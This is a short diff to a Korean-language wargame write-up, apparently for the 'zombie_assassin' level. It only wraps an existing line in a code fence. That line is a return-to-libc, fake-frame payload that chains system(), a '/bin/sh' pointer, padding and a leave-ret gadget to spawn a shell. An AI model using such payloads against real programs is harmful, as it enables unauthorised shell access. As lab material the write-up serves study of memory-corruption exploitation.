@@ -123,7 +123,9 @@ payload 시나리오 :
 
 ##### exploit 시나리오 :
 
+```
 ./zombie_assassin `python -c print "&system()"+"\x90"*4+"&["/bin/sh"]"+"\x90"*38+"&[buf-4]"+"&leave-ret 가젯"
+```
 
 &[buf-4] : 0xbffffaac
 
